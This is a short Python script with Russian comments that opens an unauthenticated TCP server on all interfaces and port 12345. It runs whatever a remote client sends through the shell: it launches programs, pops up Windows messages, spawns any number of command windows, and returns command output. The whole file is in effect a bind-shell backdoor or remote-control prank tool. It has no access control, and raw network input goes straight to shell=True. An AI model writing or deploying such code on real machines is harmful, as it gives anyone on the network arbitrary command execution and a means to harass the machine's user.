import socket
import subprocess

HOST = '0.0.0.0' # 0.0.0.0 значит что будем слушать все подключенные адреса 
PORT = 12345 # Порт по которому запущен сервер

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server_socket.bind((HOST, PORT))

server_socket.listen(1)

print(f"Сервер слушает на {HOST}:{PORT}")

while True:
    client_socket, client_address = server_socket.accept()
    print(f"Принято подключение от {client_address}")

    data = client_socket.recv(1024).decode('utf-8')
    
    if data.lower().startswith("open "):
        command = data.replace("open", "")
        print(command)
        subprocess.Popen(f"{command}", shell=True)
        
    if data.lower().startswith("msg "):
        message_text = data.replace("msg", "")
        command = f'msg * "{message_text}"'
        subprocess.Popen(f"{command}", shell=True)
    
    if data.lower().startswith("cmd "):
        command = data.replace("cmd", "")
        for i in range(int(command)):
            subprocess.Popen(f'start cmd /k ', shell=True)
                        
    if data.lower().startswith("command "):
        message_text = data.replace("command", "")
        result = subprocess.run(message_text, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        message = f"{result.stdout} оишбка (если она есть) {result.stderr}"
        client_socket.send(message.encode('utf-8'))
    
    client_socket.close()
    